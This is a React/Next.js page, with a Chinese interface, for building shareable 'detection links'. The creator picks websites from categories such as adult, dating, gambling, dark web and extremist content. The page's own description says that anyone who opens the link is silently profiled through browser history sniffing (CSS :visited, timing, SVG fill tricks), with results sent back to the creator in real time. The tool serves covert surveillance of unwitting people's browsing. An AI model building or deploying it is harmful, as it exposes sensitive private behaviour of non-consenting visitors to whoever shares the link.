"use client"

import { useState, useEffect } from "react"
import { use } from "react"
import Link from "next/link"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Trash2, Plus, Copy, ArrowRight } from "lucide-react"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Badge } from "@/components/ui/badge"
import { DEFAULT_WEBSITES } from "@/lib/websites"

// 完整的Website接口，包含所有检测状态
interface Website {
  id: string
  url: string
  name: string
  category?: string
  visited?: boolean
  visitedCSS?: boolean
  visitedRAF?: boolean
  visitedCSS3D?: boolean
  visitedSVG?: boolean
  visitedByteCode?: boolean
  checking?: boolean
}

// 检测会话数据结构，用于在localStorage中存储
interface DetectionSessionData {
  sessionId: string
  timestamp: string
  completed: boolean
  websites: Website[]
}

export default function CreatePage() {
  const router = useRouter()
  const [websites, setWebsites] = useState<Website[]>([])
  const [newUrl, setNewUrl] = useState("")
  const [newName, setNewName] = useState("")
  const [trackingId, setTrackingId] = useState("")
  const [showCopyAlert, setShowCopyAlert] = useState(false)
  const [activeCategory, setActiveCategory] = useState("all")
  const [searchTerm, setSearchTerm] = useState("")

  // 页面加载时初始化网站列表，并添加"本网站"作为测试项
  useEffect(() => {
    // 将DEFAULT_WEBSITES转换为带完整状态字段的Website[]
    const initialWebsites = DEFAULT_WEBSITES.map(site => ({
      ...site,
      visited: false,
      visitedCSS: false,
      visitedRAF: false,
      visitedCSS3D: false,
      visitedSVG: false,
      visitedByteCode: false,
      checking: false
    }));

    // 添加当前网站作为第一个测试项
    if (typeof window !== 'undefined') {
      const currentSite: Website = {
        id: "self_test_" + Date.now(),
        url: window.location.origin,
        name: "本网站 (测试用)",
        category: "other",
        visited: false,
        visitedCSS: false,
        visitedRAF: false,
        visitedCSS3D: false,
        visitedSVG: false,
        visitedByteCode: false,
        checking: false
      };
      setWebsites([currentSite, ...initialWebsites]);
    } else {
      setWebsites(initialWebsites);
    }
  }, []);

  // 添加新网站
  const addWebsite = () => {
    if (!newUrl || !newName) return

    // 简单验证URL
    let url = newUrl
    if (!url.startsWith("http://") && !url.startsWith("https://")) {
      url = "https://" + url
    }

    const newWebsite: Website = {
      id: Date.now().toString(),
      url,
      name: newName,
      category: "other",
      visited: false,
      visitedCSS: false,
      visitedRAF: false,
      visitedCSS3D: false,
      visitedSVG: false,
      visitedByteCode: false
    }

    setWebsites([...websites, newWebsite])
    setNewUrl("")
    setNewName("")
  }

  // 删除网站
  const removeWebsite = (id: string) => {
    setWebsites(websites.filter((site) => site.id !== id))
  }

  // 生成跟踪ID
  const generateTrackingId = async () => {
    const id = Math.random().toString(36).substring(2, 10);
    setTrackingId(id);

    // 创建新的检测会话数据
    const sessionData = {
      id: id,
      createdAt: new Date().toISOString(),
      completed: false,
      websites
    };

    try {
      // 保存到服务器
      const response = await fetch('/api/sessions', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(sessionData),
      });

      if (!response.ok) {
        throw new Error('保存会话数据到服务器失败');
      }

      console.log(`已成功保存检测会话数据到服务器: ${id}`, websites.length);

      // 同时保存到localStorage作为缓存
      localStorage.setItem(`health_messenger_detection_session_${id}`, JSON.stringify({
        sessionId: id,
        timestamp: new Date().toISOString(),
        completed: false,
        websites
      }));

      // 为了向后兼容，也保存旧格式的数据
      localStorage.setItem(`tracking_${id}`, JSON.stringify(websites));
    } catch (error) {
      console.error("保存检测ID数据失败:", error);

      // 如果服务器保存失败，至少保存到localStorage
      try {
        localStorage.setItem(`health_messenger_detection_session_${id}`, JSON.stringify({
          sessionId: id,
          timestamp: new Date().toISOString(),
          completed: false,
          websites
        }));
        localStorage.setItem(`tracking_${id}`, JSON.stringify(websites));
      } catch (e) {
        console.error("本地备份保存也失败:", e);
      }
    }

    return id;
  }

  // 复制链接
  const copyLink = async () => {
    // 如果已有ID则使用，否则生成新ID
    let id;
    if (trackingId) {
      id = trackingId;
    } else {
      id = await generateTrackingId();
    }

    const link = `${window.location.origin}/detect/${id}`;

    // 确保再次保存数据，防止ID生成后数据未保存
    try {
      // 创建新的检测会话数据
      const sessionData = {
        id: id,
        createdAt: new Date().toISOString(),
        completed: false,
        websites
      };

      // 保存到服务器
      const response = await fetch('/api/sessions', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(sessionData),
      });

      if (!response.ok) {
        throw new Error('保存会话数据到服务器失败');
      }

      // 同时保存到localStorage作为缓存
      localStorage.setItem(`health_messenger_detection_session_${id}`, JSON.stringify({
        sessionId: id,
        timestamp: new Date().toISOString(),
        completed: false,
        websites
      }));
      localStorage.setItem(`tracking_${id}`, JSON.stringify(websites)); // 向后兼容
    } catch (error) {
      console.error("保存检测会话数据失败:", error);

      // 如果服务器保存失败，至少保存到localStorage
      try {
        localStorage.setItem(`health_messenger_detection_session_${id}`, JSON.stringify({
          sessionId: id,
          timestamp: new Date().toISOString(),
          completed: false,
          websites
        }));
        localStorage.setItem(`tracking_${id}`, JSON.stringify(websites)); // 向后兼容
      } catch (e) {
        console.error("本地备份保存也失败:", e);
      }
    }

    navigator.clipboard.writeText(link);
    setShowCopyAlert(true);
    setTimeout(() => setShowCopyAlert(false), 3000);
  };

  // 查看结果
  const viewResults = async () => {
    // 如果已有ID则使用，否则生成新ID
    let id;
    if (trackingId) {
      id = trackingId;
    } else {
      id = await generateTrackingId();
    }

    // 确保再次保存数据，防止ID生成后数据未保存
    try {
      // 创建新的检测会话数据
      const sessionData = {
        id: id,
        createdAt: new Date().toISOString(),
        completed: false,
        websites
      };

      // 保存到服务器
      const response = await fetch('/api/sessions', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(sessionData),
      });

      if (!response.ok) {
        throw new Error('保存会话数据到服务器失败');
      }

      // 同时保存到localStorage作为缓存
      localStorage.setItem(`health_messenger_detection_session_${id}`, JSON.stringify({
        sessionId: id,
        timestamp: new Date().toISOString(),
        completed: false,
        websites
      }));
      localStorage.setItem(`tracking_${id}`, JSON.stringify(websites)); // 向后兼容
    } catch (error) {
      console.error("保存检测会话数据失败:", error);

      // 如果服务器保存失败，至少保存到localStorage
      try {
        localStorage.setItem(`health_messenger_detection_session_${id}`, JSON.stringify({
          sessionId: id,
          timestamp: new Date().toISOString(),
          completed: false,
          websites
        }));
        localStorage.setItem(`tracking_${id}`, JSON.stringify(websites)); // 向后兼容
      } catch (e) {
        console.error("本地备份保存也失败:", e);
      }
    }

    router.push(`/results/${id}`);
  };

  // 过滤网站
  const filteredWebsites = websites.filter((site) => {
    const matchesCategory = activeCategory === "all" || site.category === activeCategory
    const matchesSearch =
      site.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
      site.url.toLowerCase().includes(searchTerm.toLowerCase())
    return matchesCategory && matchesSearch
  })

  // 获取所有类别
  const categories = [
    { id: "all", name: "全部" },
    { id: "adult", name: "成人内容" },
    { id: "social", name: "社交媒体" },
    { id: "video", name: "视频平台" },
    { id: "gaming", name: "游戏网站" },
    { id: "dating", name: "约会交友" },
    { id: "forum", name: "论坛讨论区" },
    { id: "content", name: "内容分享" },
    { id: "anonymous", name: "匿名社交" },
    { id: "crypto", name: "加密货币" },
    { id: "gambling", name: "赌博" },
    { id: "darkweb", name: "暗网相关" },
    { id: "tobacco", name: "电子烟" },
    { id: "alcohol", name: "酒精" },
    { id: "extreme", name: "极端内容" },
    { id: "piracy", name: "盗版内容" },
    { id: "hacking", name: "黑客" },
    { id: "china", name: "中国网站" },
    { id: "other", name: "其他" },
  ]

  return (
    <div className="min-h-screen bg-gradient-to-b from-green-50 to-green-100 py-12">
      <div className="container mx-auto px-4">
        <Link href="/" className="text-green-700 hover:text-green-900 mb-8 inline-block">
          ← 返回首页
        </Link>

        <Card className="max-w-4xl mx-auto shadow-lg">
          <CardHeader>
            <CardTitle className="text-2xl text-green-700">创建检测链接</CardTitle>
            <CardDescription>自定义您想要检测的网站列表，然后生成一个可以分享的链接</CardDescription>
          </CardHeader>

          <CardContent>
            <div className="space-y-6">
              <div className="space-y-4">
                <div className="flex flex-col sm:flex-row gap-4">
                  <div className="flex-1">
                    <Label htmlFor="search">搜索网站</Label>
                    <Input
                      id="search"
                      placeholder="输入网站名称或网址搜索"
                      value={searchTerm}
                      onChange={(e) => setSearchTerm(e.target.value)}
                      className="mt-1"
                    />
                  </div>
                  <div className="flex-1">
                    <Label>网站类别</Label>
                    <select
                      className="w-full mt-1 rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background"
                      value={activeCategory}
                      onChange={(e) => setActiveCategory(e.target.value)}
                    >
                      {categories.map((category) => (
                        <option key={category.id} value={category.id}>
                          {category.name}
                        </option>
                      ))}
                    </select>
                  </div>
                </div>
              </div>

              <div>
                <h3 className="text-lg font-medium mb-2">当前网站列表 ({filteredWebsites.length}个)</h3>
                <div className="grid gap-2 max-h-[400px] overflow-y-auto p-1">
                  {filteredWebsites.map((site) => (
                    <div key={site.id} className="flex items-center justify-between p-3 bg-white rounded-md border">
                      <div>
                        <p className="font-medium">{site.name}</p>
                        <p className="text-sm text-gray-500">{site.url}</p>
                      </div>
                      <Button
                        variant="ghost"
                        size="icon"
                        onClick={() => removeWebsite(site.id)}
                        className="text-red-500 hover:text-red-700 hover:bg-red-50"
                      >
                        <Trash2 className="h-5 w-5" />
                      </Button>
                    </div>
                  ))}
                </div>
              </div>

              <div className="border-t pt-4">
                <h3 className="text-lg font-medium mb-3">添加新网站</h3>
                <div className="grid gap-4 sm:grid-cols-[1fr_1fr_auto]">
                  <div className="space-y-2">
                    <Label htmlFor="website-url">网站地址</Label>
                    <Input
                      id="website-url"
                      placeholder="例如: www.example.com"
                      value={newUrl}
                      onChange={(e) => setNewUrl(e.target.value)}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="website-name">网站名称</Label>
                    <Input
                      id="website-name"
                      placeholder="例如: 示例网站"
                      value={newName}
                      onChange={(e) => setNewName(e.target.value)}
                    />
                  </div>
                  <div className="flex items-end">
                    <Button
                      onClick={addWebsite}
                      className="bg-green-600 hover:bg-green-700"
                      disabled={!newUrl || !newName}
                    >
                      <Plus className="h-5 w-5 mr-1" /> 添加
                    </Button>
                  </div>
                </div>
              </div>
            </div>
          </CardContent>

          <CardFooter className="flex-col space-y-4">
            {trackingId && (
              <div className="w-full p-3 bg-green-50 rounded-md border border-green-200 flex items-center justify-between">
                <div>
                  <p className="font-medium text-green-800">您的检测ID:</p>
                  <p className="text-green-700 font-mono">{trackingId}</p>
                </div>
                <Badge variant="outline" className="bg-green-100 text-green-800 border-green-300">
                  已生成
                </Badge>
              </div>
            )}

            <div className="flex flex-col sm:flex-row gap-3 w-full">
              <Button onClick={copyLink} className="flex-1 bg-green-600 hover:bg-green-700">
                <Copy className="h-5 w-5 mr-2" /> 生成并复制链接
              </Button>
              <Button onClick={viewResults} className="flex-1">
                <ArrowRight className="h-5 w-5 mr-2" /> 查看结果
              </Button>
            </div>

            {showCopyAlert && (
              <Alert className="bg-green-50 border-green-200 text-green-800">
                <AlertDescription>检测链接已复制到剪贴板！您可以将其分享给需要检测的人。</AlertDescription>
              </Alert>
            )}
          </CardFooter>
        </Card>

        <div className="max-w-4xl mx-auto mt-6 bg-white p-4 rounded-md border shadow-sm">
          <h3 className="font-medium text-gray-800 mb-2">功能说明</h3>
          <p className="text-sm text-gray-600 mb-2">
            此工具使用多种浏览器历史检测方法（包括RequestAnimationFrame时间差异、CSS状态检测、CSS 3D变换和SVG填充）来检测用户是否访问过指定网站。
          </p>
          <p className="text-sm text-gray-600 mb-2">
            <strong>实时检测功能：</strong> 当被检测者打开您分享的链接时，系统会立即自动开始检测并实时保存结果。您可以在结果页面实时查看检测进度和结果，每秒自动刷新，无需等待检测完成。
          </p>
          <p className="text-sm text-gray-600 mb-2">
            <strong>真实网站数据：</strong> 系统包含各分类的真实网站数据，包括成人内容(230个)、社交媒体、视频平台、游戏网站、约会交友、论坛和讨论区、赌博和彩票、暗网和匿名网络、黑客和安全、虚拟货币、违禁品市场等多个分类。
          </p>
          <p className="text-sm text-gray-600">
            <strong>测试验证：</strong> 第一个网站"本网站(测试用)"是当前网站的URL，用于验证检测方法的有效性。如果您已访问此网页，它应该会被检测为"已访问"状态。
          </p>
        </div>
      </div>
    </div>
  )
}
